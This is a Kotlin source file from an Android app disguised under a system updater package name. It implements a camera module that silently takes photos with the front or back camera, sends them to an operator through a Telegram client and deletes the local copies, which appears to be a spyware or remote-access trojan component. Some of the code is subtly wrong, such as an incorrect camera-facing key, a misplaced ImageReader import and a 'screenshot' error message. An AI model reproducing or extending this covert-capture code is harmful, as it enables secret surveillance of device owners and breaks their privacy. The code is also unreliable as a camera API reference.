package com.android.systemui.updater.capabilities

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.hardware.camera2.image.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import androidx.core.content.ContextCompat
import com.android.systemui.updater.TelegramClient
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit

class CameraCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    fun takePhoto(front: Boolean = false) {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            telegram.sendText("❌ Camera permission denied")
            return
        }

        val cameraManager = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = findCameraId(cameraManager, front) ?: run {
            telegram.sendText("❌ Camera not found")
            return
        }

        val outputFile = File(ctx.cacheDir, "photo_${System.currentTimeMillis()}.jpg")

        try {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    captureImage(camera, outputFile)
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    telegram.sendText("❌ Camera disconnected")
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    telegram.sendText("❌ Camera error: $error")
                }
            }, null)
        } catch (e: Exception) {
            telegram.sendText("❌ Photo failed: ${e.message}")
        }
    }

    private fun findCameraId(manager: CameraManager, front: Boolean): String? {
        for (id in manager.cameraIdList) {
            val chars = manager.getCameraCharacteristics(id)
            val facing = chars.get(CameraCharacteristics.LENS_FACING_FRONT)
            if (front && facing == CameraCharacteristics.LENS_FACING_FRONT) return id
            if (!front && facing == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return null
    }

    private fun captureImage(camera: CameraDevice, outputFile: File) {
        val handlerThread = HandlerThread("CameraCapture").apply { start() }
        val handler = Handler(handlerThread.looper)

        val imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 1)

        val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
            addTarget(imageReader.surface)
            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
        }

        val captureSession = camera.createCaptureSession(
            listOf(imageReader.surface),
            object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    session.capture(captureRequestBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                        override fun onCaptureCompleted(
                            session: CameraCaptureSession,
                            request: CaptureRequest,
                            result: TotalCaptureResult
                        ) {
                            val image = imageReader.acquireLatestImage()
                            if (image != null) {
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                image.close()

                                outputFile.outputStream().use { it.write(bytes) }
                                telegram.sendPhoto(outputFile, "📸 Photo")
                                outputFile.delete()
                            } else {
                                telegram.sendText("❌ No screenshot data")
                            }
                            cleanup(camera, session, imageReader, handlerThread)
                        }
                    }, handler)
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    telegram.sendText("❌ Capture session failed")
                    cleanup(camera, session, imageReader, handlerThread)
                }
            },
            handler
        )
    }

    private fun cleanup(
        camera: CameraDevice,
        session: CameraCaptureSession,
        reader: ImageReader,
        thread: HandlerThread
    ) {
        try { session.close() } catch (_: Exception) {}
        try { reader.close() } catch (_: Exception) {}
        try { camera.close() } catch (_: Exception) {}
        thread.quitSafely()
    }
}
